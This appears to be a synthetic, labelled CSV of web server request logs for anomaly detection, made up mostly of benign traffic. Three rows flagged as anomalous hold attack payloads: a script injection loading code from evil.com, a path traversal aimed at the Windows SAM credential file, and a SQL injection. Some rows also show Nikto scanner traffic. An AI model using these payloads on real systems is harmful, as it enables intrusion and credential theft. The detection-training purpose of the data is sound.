record_id,timestamp,client_ip,field_a,field_b,field_c,field_d,field_e,field_f,is_anomaly
4e32dc3d-519b-4422-81ae-2772ce6c0a1f,2026-05-02 12:47:42,10[.]9[.]120[.]84,GET,/api/v1/auth/logout?page[=]10&sort[=]name&limit[=]10,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,47.47,,0
42c75053-b032-4fe1-a8d6-08ed7de9d2b8,2026-05-07 11:31:49,190[.]79[.]213[.]87,POST,/api/v1/dashboard/widgets,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,68.46,,0
9b6072af-bfed-42fe-ba26-50a82ce56fba,2026-05-12 16:19:34,192[.]168[.]10[.]253,GET,/api/v1/reviews?page[=]12&sort[=]name&limit[=]10,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",74.45,,0
aac67b17-30bd-4331-bcdf-28c4d41ad07e,2026-05-01 18:56:36,172[.]18[.]108[.]49,GET,/api/v1/recommendations?sort[=]created_desc,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",248.92,,0
525e459c-85c0-474c-8863-79a40f4f0815,2026-05-07 12:27:37,172[.]19[.]127[.]69,GET,/sitemap.xml,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",50.64,,0
4a267147-55e8-4e27-afd6-fda46e45ed64,2026-05-09 16:39:03,172[.]27[.]22[.]73,GET,/api/v1/auth/refresh?category[=]sports,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",66.84,,0
7c3cdbf7-9f41-49bc-9e5c-01eb6f3afc96,2026-05-03 02:29:13,10[.]33[.]110[.]24,POST,/about,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",274.73,,0
93910f98-9b15-4661-874b-aa7b01d323d1,2026-05-07 19:08:10,192[.]168[.]3[.]199,GET,/static/js/app.js,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",84.2,,0
e1a37960-5a49-4de2-a893-3ba2ed8d0709,2026-05-10 16:20:04,192[.]168[.]13[.]23,GET,/robots.txt,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",204.14,,0
dd7c160a-4082-4c5a-9c29-2fec6a3d711d,2026-05-05 09:05:09,10[.]26[.]160[.]74,GET,/api/v1/users/settings,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",187.69,,0
008a5aa4-249a-4277-812f-ac93339e5c35,2026-05-13 15:29:19,39[.]164[.]160[.]45,GET,/static/js/vendor.js,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",24.12,,0
3b1ab025-32cc-4403-b73f-69f7c806e89b,2026-05-11 14:35:50,192[.]168[.]15[.]37,POST,/api/v1/reviews?page[=]16,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,59.83,,0
f6959681-83f3-41c8-ba63-137c5d6d6dbe,2026-05-10 16:03:54,181[.]157[.]28[.]6,POST,/api/v1/categories?page[=]14,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",108.35,,0
d4f79df5-276f-4b86-966f-72702b139da6,2026-05-05 03:36:26,192[.]168[.]6[.]145,OPTIONS,/api/v1/payments/methods,ALLOW,PostmanRuntime/7.36.0,135.77,,0
aeccae95-f528-4bfd-98c4-904e02efa486,2026-05-02 14:17:56,192[.]168[.]11[.]235,POST,/,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",105.22,,0
7395bdc0-4f84-4240-8a67-580f1d63a818,2026-05-14 14:41:48,10[.]25[.]33[.]49,GET,/api/v1/auth/login,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",289.67,,0
7d9cb8fb-95aa-496d-a7f0-12434ba079c5,2026-05-09 08:51:01,10[.]16[.]144[.]72,GET,/api/v1/cart,ALLOW,Go-http-client/2.0,64.3,,0
e82563a6-c860-4880-ab52-91d1a2307fad,2026-05-06 20:35:32,53[.]174[.]222[.]156,GET,/api/v1/auth/refresh,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",160.73,,0
83fc1562-5029-4fc2-b1ad-78dbbc3d9c1a,2026-05-14 12:39:39,192[.]168[.]15[.]34,GET,/api/v1/dashboard/widgets?page[=]3&sort[=]name&limit[=]10,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,29.77,,0
9396318f-755f-4a7e-b315-7e0689bd6827,2026-05-01 17:16:02,172[.]20[.]77[.]135,GET,/api/v1/cart?page[=]13,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",137.14,,0
e2f0f260-c66d-40af-9893-fc5463c2ed8f,2026-05-10 05:22:11,10[.]22[.]83[.]206,GET,/manifest.json,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",119.95,,0
223bd3a5-b7a7-40b7-ae26-b24547baf2e8,2026-05-06 10:43:11,172[.]27[.]22[.]73,PUT,/api/v1/checkout?filter[=]active,ALLOW,PostmanRuntime/7.36.0,172.65,,0
4acf71d5-6ecb-4e79-858f-7a385b8d3636,2026-05-01 11:33:03,172[.]23[.]164[.]126,GET,/static/js/app.js,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",58.49,,0
88c30076-8a9a-4643-8274-4822bb9a5bdb,2026-05-09 16:03:36,192[.]168[.]7[.]199,PATCH,/api/v1/recommendations,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,26.24,,0
ffb94bbd-dd1c-4a1e-8115-528383c9a7bc,2026-05-04 15:42:40,192[.]168[.]16[.]6,GET,/api/v1/products?filter[=]active,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",94.53,,0
7c219716-fec2-48f4-ace8-7e22570d0c90,2026-05-10 15:34:27,172[.]27[.]22[.]73,GET,/static/js/app.js,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",101.52,,0
a8bb729e-256e-43ec-b810-e6b69b5effd7,2026-05-04 15:09:12,192[.]168[.]1[.]44,GET,/about,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",150.43,,0
15f86f35-c799-4fb1-b0c1-616cb9000a1e,2026-05-14 11:28:05,172[.]25[.]42[.]69,GET,/api/v1/products?page[=]15&sort[=]name&limit[=]10,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",141.61,,0
20944cd1-dfd8-4d05-b5e0-2d45765e5d59,2026-05-14 10:11:02,192[.]168[.]14[.]127,GET,/api/v1/products/3649,ALLOW,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0,117.96,,0
cdee20af-1ea1-4136-89cb-294ea01d4b0f,2026-05-02 12:19:25,172[.]25[.]190[.]132,POST,/contact,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",246.21,,0
14648e76-0f7d-4c70-a1f6-8791fcd2e9a3,2026-05-11 09:23:08,192[.]168[.]2[.]36,POST,/api/v1/admin/login,BLOCK,Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check),118.93,,0
279f2db3-9d7a-41a1-b4ee-219ce64a6bb6,2026-05-05 14:03:26,10[.]25[.]45[.]251,PUT,/about,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,52.32,,0
716b97d4-22d6-46c5-8478-4bbe3f7d50ea,2026-05-14 23:17:49,10[.]33[.]3[.]197,POST,/api/v1/wishlist,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",102.63,,0
2c1bf427-9b3a-487f-b478-a0225163a404,2026-05-11 13:50:46,10[.]36[.]41[.]27,GET,/static/js/app.js,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",158.0,,0
93de7072-d32f-466b-b749-9776ff52746a,2026-05-06 15:02:59,172[.]19[.]199[.]154,GET,/api/v1/orders?page[=]12&sort[=]name&limit[=]10,ALLOW,Go-http-client/2.0,111.29,,0
87c0c72e-79d5-431b-a795-3221e7d08303,2026-05-06 12:44:46,10[.]0[.]73[.]155,GET,/api/v1/auth/login,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",144.84,,0
2e0d9aa5-50b8-430f-add2-fee0ef550513,2026-05-10 18:43:06,192[.]168[.]6[.]245,GET,/api/v1/cart,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",82.71,,0
1727e894-593c-4dbe-b0d7-155316417b55,2026-05-06 15:57:10,10[.]36[.]185[.]124,GET,/static/js/app.js,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",394.07,,0
8d971b5a-5314-4ce0-be4d-a552e757d356,2026-05-05 12:55:16,192[.]168[.]8[.]139,GET,/api/v1/recommendations,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,385.89,,0
628639de-b744-43e0-93c7-51967f7f9c95,2026-05-13 19:17:19,150[.]44[.]189[.]67,POST,/static/css/print.css,ALLOW,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),267.47,,0
35cb66ba-a0ec-4944-b70b-be4f74924d47,2026-05-06 11:10:36,172[.]27[.]22[.]73,GET,/api/v1/auth/logout?sort[=]price_asc,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",138.52,,0
1af4beb7-8ba5-40fe-bdea-243d8e3c0c28,2026-05-08 11:20:13,10[.]15[.]71[.]4,GET,/contact,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",85.16,,0
0d308ab6-6979-4bca-83b4-8c0618b2f6e1,2026-05-14 10:11:26,192[.]168[.]14[.]127,GET,/api/v1/checkout,ALLOW,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0,133.93,,0
b914ac6c-597c-4f9b-81c2-cce833d6ab28,2026-05-08 12:17:44,10[.]26[.]27[.]34,GET,/api/v1/categories,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",119.69,,0
024e04a8-a4da-4a54-8889-275bdeecd859,2026-05-14 12:54:55,192[.]168[.]10[.]106,GET,/static/js/analytics.js,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,122.55,,0
3d1da6db-0b3b-430e-af9a-7aa30b9ce3ef,2026-05-05 15:08:01,188[.]5[.]124[.]104,GET,/,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",138.27,,0
1653cb44-7629-45d5-b2d6-40412d08142f,2026-05-12 13:29:58,192[.]168[.]3[.]248,GET,/docs,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",166.06,,0
97fce920-80a7-440e-98dc-3c8116912ac9,2026-05-13 19:54:47,192[.]168[.]15[.]6,OPTIONS,/api/v1/auth/refresh,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",140.68,,0
1a01aa3d-e3ab-4edf-8b4f-9a792b781850,2026-05-06 13:59:01,10[.]11[.]78[.]72,POST,/api/v1/users/settings,ALLOW,Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot),43.06,,0
a426a784-1a10-4426-90ef-eecf388db56b,2026-05-04 11:15:56,172[.]27[.]22[.]73,GET,/static/img/hero.webp,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",131.55,,0
67389a44-db07-4fbe-8200-3938fbaf3b97,2026-05-12 14:42:26,192[.]168[.]19[.]153,GET,/api/v1/checkout?sort[=]created_desc,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",271.15,,0
e626d479-0393-457f-99f7-f1f9744de528,2026-05-09 12:23:25,172[.]28[.]196[.]150,GET,/terms,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,54.38,,0
40b9ddc0-6cff-4eaf-8020-286009e9fa34,2026-05-05 13:22:05,172[.]27[.]22[.]73,GET,/api/v1/checkout,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",150.6,,0
ac9d569e-e616-4a21-9978-f29dc2b2f9eb,2026-05-11 21:34:54,166[.]109[.]199[.]253,GET,/api/v1/users/profile,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",32.58,,0
8a479713-77ad-4c2e-8c26-16d234eee99c,2026-05-12 12:16:42,192[.]168[.]10[.]190,GET,/api/v1/dashboard/stats?sort[=]created_desc,ALLOW,Go-http-client/2.0,893.63,,0
6173ac0b-3c61-4fbb-9123-ce645a247e86,2026-05-14 09:48:42,10[.]2[.]110[.]119,POST,/api/v1/search?q[=][<]script src[=]//evil.com/x.js[>][<]/script[>],ALLOW,Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check),245.6,,1
a383df25-7ead-4d07-ba1d-c99163cbde4e,2026-05-05 16:19:44,181[.]157[.]28[.]6,PATCH,/api/v1/auth/refresh,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",177.95,,0
48a56a1f-4dd8-4505-a4e9-4b45d254127b,2026-05-05 13:51:23,192[.]168[.]13[.]23,GET,/api/v1/search,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",136.37,,0
8b24ea1a-88f0-4423-b110-b2aa2e4bcc63,2026-05-02 14:54:42,192[.]168[.]15[.]34,GET,/static/img/logo.png,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,105.89,,0
211463af-28bc-4b34-974e-2e6c9c388f16,2026-05-13 14:42:24,192[.]168[.]6[.]110,GET,/static/css/theme.css,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",56.82,,0
c887524c-521a-4488-8064-878781296960,2026-05-03 14:22:54,10[.]32[.]84[.]146,GET,/blog,ALLOW,"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",123.59,,0
01061bc8-623d-4473-ad88-52736d28178a,2026-05-14 21:46:32,192[.]168[.]17[.]244,GET,/api/v1/products/2506?page[=]16,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",210.42,,0
9ac5e4c1-a648-4d40-9d78-a999ecc7129b,2026-05-11 15:56:28,192[.]168[.]10[.]253,GET,/api/v1/payments/methods?page[=]14&limit[=]20,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",44.78,,0
1d82bcce-b3d3-44fc-8783-82d87e66a59a,2026-05-06 19:55:59,172[.]27[.]22[.]73,GET,/api/v1/auth/refresh?q[=]book,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",105.13,,0
f29ab64e-2a7e-49f5-a434-26f3e1fb8d91,2026-05-08 04:55:04,10[.]5[.]253[.]195,POST,/api/v1/cart?category[=]clothing,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",75.76,,0
e4b97ea1-de4e-4954-925e-67af0b85377b,2026-05-10 15:48:26,87[.]203[.]106[.]246,GET,/api/v1/users/addresses,ALLOW,axios/1.6.7,52.83,,0
cc99da26-3567-47ca-ad5f-94fdec4045c4,2026-05-05 14:15:11,10[.]16[.]220[.]42,GET,/careers,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",116.79,,0
c52bb67d-f77f-4222-9552-c326c710a4d7,2026-05-04 23:36:52,192[.]168[.]5[.]195,GET,/api/v1/auth/login?category[=]sports,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",93.96,,0
fa2b2882-9eb9-4e2e-90aa-dabe036938c6,2026-05-12 15:47:55,192[.]168[.]19[.]92,GET,/..\..\..\windows\system32\config\sam,ALLOW,python-urllib/3.11,212.96,,1
cf24af38-e840-433b-b06f-033af19b4121,2026-05-03 05:42:01,10[.]33[.]110[.]24,POST,/api/v1/reviews,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,65.91,,0
dc1fb124-1bcd-40a8-840a-1d3db6e0f06e,2026-05-01 14:30:58,192[.]168[.]10[.]109,GET,/static/css/theme.css,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",149.17,,0
a440201d-e7f4-4a56-8020-8abfd40622eb,2026-05-07 14:11:13,172[.]19[.]99[.]105,POST,"/api/v1/categories?page[=]1['] UNION SELECT null,version[(][)]--",BLOCK,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",209.7,,1
1e83bda1-1bc3-4d82-bb37-de0c4a941911,2026-05-07 15:21:11,10[.]37[.]168[.]42,GET,/static/js/app.js,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,68.81,,0
59bc4a0c-ef84-4b6b-9e3b-2e256f19a8dd,2026-05-08 14:05:21,10[.]20[.]194[.]204,PATCH,/api/v1/users/addresses,ALLOW,PostmanRuntime/7.36.0,83.73,,0
f92929f2-8f65-4494-b1eb-264a8106be0c,2026-05-04 15:15:34,10[.]46[.]41[.]116,GET,/static/img/banner.jpg,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",81.29,,0
bc2076c4-3497-4c3f-b8f9-492c5c775fa1,2026-05-05 13:53:50,192[.]168[.]13[.]23,GET,/api/v1/orders/7003,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",106.18,,0
2dad8bf8-2c1c-4bb2-9c3b-2ffadb7db114,2026-05-12 13:37:55,103[.]143[.]203[.]189,GET,/help,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",144.01,,0
b4d1f7ab-c40e-4d33-bc0e-9d8c6d67cca8,2026-05-10 09:12:20,192[.]168[.]6[.]110,GET,/careers,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",82.3,,0
2e928e24-22ea-4198-9ad6-df47ff512e96,2026-05-14 13:52:54,192[.]168[.]2[.]218,GET,/static/js/analytics.js,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",45.03,,0
64f909e7-f308-42ce-b915-00505a9761ef,2026-05-05 14:08:34,10[.]0[.]73[.]155,GET,/sitemap.xml,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",65.69,,0
8277aac6-575e-4516-a26c-e4f9fc687aa4,2026-05-14 13:19:40,172[.]27[.]22[.]73,GET,/manifest.json,ALLOW,PostmanRuntime/7.36.0,44.77,,0
ed060ed2-4bc1-4e17-8355-2c41f8a5a8da,2026-05-12 17:48:43,192[.]168[.]16[.]193,OPTIONS,/docs,ALLOW,Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot),89.15,,0
06e994b2-a871-481d-9499-d73edd603fad,2026-05-14 11:52:06,10[.]43[.]202[.]120,GET,/api/v1/products,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",82.83,,0
31a10e30-90db-4f8d-a204-e416d8f1b95c,2026-05-04 10:23:09,10[.]38[.]21[.]153,GET,/api/v1/cart/items,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",165.24,,0
6cb73f13-029a-4917-8553-e7a474c25c5e,2026-05-11 10:28:19,192[.]168[.]14[.]89,POST,/static/img/banner.jpg,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,146.73,,0
9818c0a2-819a-4bf8-aa4d-8f00ef8ff584,2026-05-06 12:29:58,172[.]27[.]22[.]73,GET,/api/v1/products,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",326.77,,0
8ae815cf-15d3-4db1-a675-7dbe6c259ab3,2026-05-14 15:06:50,192[.]168[.]2[.]210,GET,/api/v1/auth/login?sort[=]created_desc,ALLOW,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),38.16,,0
5329b864-e0d1-472a-bee0-abc5e64df8ba,2026-05-11 14:32:01,10[.]9[.]169[.]57,GET,/favicon.ico,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",106.26,,0
5ce71d7d-140c-44fc-92f3-9823f0ea2e0f,2026-05-04 14:58:12,173[.]254[.]69[.]67,GET,/api/v1/cart/items,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",107.24,,0
928bfb0b-ae4b-4e9b-8077-1119b5a177c9,2026-05-04 16:20:55,10[.]50[.]46[.]172,POST,/favicon.ico,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",397.67,,0
e3620aac-f685-468b-a725-d441c61d2ca5,2026-05-06 15:38:26,10[.]13[.]58[.]177,POST,/api/v1/auth/token,ALLOW,Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check),59.71,,0
7e6f8a3c-3c4c-4fa3-a21f-f6532e8890e9,2026-05-03 17:36:58,172[.]30[.]252[.]33,GET,/api/v1/orders/8453?page[=]7,ALLOW,"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",65.83,,0
fa7ab3b3-0f86-44e4-9eae-fe300914a150,2026-05-05 18:41:52,172[.]27[.]22[.]73,DELETE,/api/v1/users/profile,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",107.19,,0
